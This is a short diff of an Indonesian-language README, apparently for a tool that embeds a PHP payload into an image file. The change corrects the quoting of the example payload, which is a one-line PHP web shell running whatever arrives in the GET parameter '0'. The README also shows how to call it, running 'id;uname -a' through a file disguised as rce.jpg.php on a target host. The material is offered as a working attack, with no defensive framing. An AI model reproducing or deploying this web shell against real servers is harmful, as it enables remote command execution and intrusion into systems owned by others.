@@ -5,12 +5,12 @@
 ## Ubah Payload/Kode yang ingin di inject ke gambar
 
 ```
-$miniPayload = taruh payloadmu disini;
+$miniPayload = 'taruh payloadmu disini';
 ```
 #### contoh payload yang dipake :
 
 ```
-$miniPayload = '<?=`$_GET[0]`?>;
+$miniPayload = '<?=`$_GET[0]`?>';
 as
 vuln.com/rce.jpg.php?0=id;uname -a
 ```
